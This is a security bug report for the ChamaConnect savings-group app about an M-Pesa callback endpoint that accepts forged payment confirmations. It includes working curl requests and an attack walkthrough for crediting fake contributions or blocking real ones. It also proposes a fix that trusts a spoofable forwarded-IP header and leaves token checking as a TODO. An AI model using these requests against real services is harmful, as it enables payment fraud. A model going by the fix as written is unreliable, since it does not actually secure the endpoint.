<p align="center">
  <img src="https://chamaconnect.io/images/chamaconnect.svg" alt="ChamaConnect" />
</p>

# BUG-054 — M-Pesa callback endpoint has no authentication or signature validation (forged callbacks accepted)

| Field | Value |
|---|---|
| Severity | **Critical (unauthenticated write — financial fraud via forged M-Pesa receipts)** |
| Surface | API / M-Pesa integration |
| Status | Open |
| Discovered | 2026-04-20 |
| Discovered by | Manual (curl) |

## Evidence

The STK Push result callback endpoint is publicly accessible with no authentication, no IP allowlist, and no Safaricom HMAC/OAuth signature validation:

```bash
# No token, no headers, from any IP — returns HTTP 200
$ curl -sS -X POST https://chamaconnect.io/backend/api/v1/transactions/group-contribution/mobile-money-callback \
    -H 'content-type: application/json' \
    --data-raw '{
      "Body": {
        "stkCallback": {
          "MerchantRequestID": "FORGED",
          "CheckoutRequestID": "ws_CO_26032026152439691707220932",
          "ResultCode": 0,
          "ResultDesc": "The service request is processed successfully.",
          "CallbackMetadata": {
            "Item": [
              {"Name":"Amount","Value":1000},
              {"Name":"MpesaReceiptNumber","Value":"FAKERECEIPT"},
              {"Name":"TransactionDate","Value":20260420},
              {"Name":"PhoneNumber","Value":254707220932}
            ]
          }
        }
      }
    }'
{"message":"Already processed","status":"success","data":null}
# HTTP 200 — the server looked up the checkout ID and processed the callback!
```

The same endpoint is also accessible via the Next.js proxy:

```bash
$ curl -sS -X POST https://chamaconnect.io/api/proxy/transactions/group-contribution/mobile-money-callback \
    -H 'content-type: application/json' \
    --data-raw '{ ... same body ... }'
{"message":"Already processed","status":"success","data":null}
# HTTP 200
```

**How an attack works:**

1. The victim initiates an M-Pesa STK Push for a contribution. The `mpesaCheckOutId` is stored on the transaction record.
2. The `mpesaCheckOutId` is exposed in the full transaction list (`GET /api/proxy/transactions` — BUG-030), which any authenticated user can read.
3. The attacker crafts a forged STK callback with `ResultCode: 0` (success) and `MpesaReceiptNumber: FAKE123`, `CheckoutRequestID: <victim's checkout ID>`.
4. The server marks the transaction as COMPLETED and credits the chama with a fake receipt.

The attacker can also forge a `ResultCode: 1` (failure) callback on a legitimate payment to mark it as failed, blocking the real member's contribution from being credited.

The "Already processed" response for the previously used checkout ID (`ws_CO_26032026152439691707220932`) confirms the server is actively matching callbacks to transactions — the attack is mechanically feasible.

## User impact

- **Financial fraud:** An attacker can create contributions of arbitrary amounts without actually paying.
- **Payment blocking:** An attacker can reject any real member's pending M-Pesa payment by forging a failure callback.
- **Chama treasury manipulation:** Fake receipts contaminate the double-entry ledger, breaking the trial balance and balance sheet.

## Root cause

The Daraja documentation requires implementers to verify callbacks using:
1. **OAuth access token** — The callback request from Safaricom includes an `Authorization: Bearer <safaricom_token>` header that should be validated.
2. **IP allowlist** — Safaricom publishes the IP ranges their callbacks originate from; only those IPs should be allowed.
3. **HTTPS + certificate pinning** — The callback URL must be HTTPS; Safaricom performs certificate validation.

None of these are implemented. The endpoint simply parses the body and processes any incoming request.

## Proposed fix

```ts
// server/middleware/mpesa-callback-auth.ts
import { Request, Response, NextFunction } from 'express';

// Safaricom sandbox callback IP ranges (update for production)
const SAFARICOM_IPS = new Set([
  '196.201.214.200', '196.201.214.206', '196.201.213.114',
  '196.201.214.207', '196.201.214.208', '196.201.213.44',
  '196.201.212.127', '196.201.212.138', '196.201.212.129',
  '196.201.212.136', '196.201.212.74',  '196.201.212.69',
]);

export function validateDarajaCallback(req: Request, res: Response, next: NextFunction) {
  const realIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim()
              || req.socket.remoteAddress
              || '';

  if (!SAFARICOM_IPS.has(realIp)) {
    console.warn(`[mpesa] blocked callback from non-Safaricom IP: ${realIp}`);
    // Return 200 to avoid Daraja retries for malicious requests
    return res.json({ ResultCode: 0, ResultDesc: 'Accepted' });
  }

  // Validate OAuth token from Authorization header
  const authHeader = req.headers['authorization'] ?? '';
  if (!authHeader.startsWith('Bearer ')) {
    return res.json({ ResultCode: 0, ResultDesc: 'Accepted' });
  }
  // TODO: verify the token against Safaricom's token endpoint
  next();
}

// In router:
router.post('/transactions/group-contribution/mobile-money-callback',
  validateDarajaCallback,
  transactionController.mpesaCallback
);
```

Additional mitigations:
- Log all callback attempts with source IP, checkout ID, and result code.
- Store the `MpesaReceiptNumber` returned by Safaricom and verify it is unique (deduplicate against the Safaricom transaction query API before crediting).
- Use an idempotency key (`CheckoutRequestID`) — mark it consumed on first successful processing to prevent replay attacks.

## Verification

1. `POST /backend/api/v1/transactions/group-contribution/mobile-money-callback` from a non-Safaricom IP → `{"ResultCode":0,"ResultDesc":"Accepted"}` (silent rejection).
2. A real Safaricom callback from the allowed IP range → processed normally.
3. A replayed `CheckoutRequestID` → ignored (idempotent).
4. Regression test in `/recon/tests/mpesa-callback.spec.ts`.
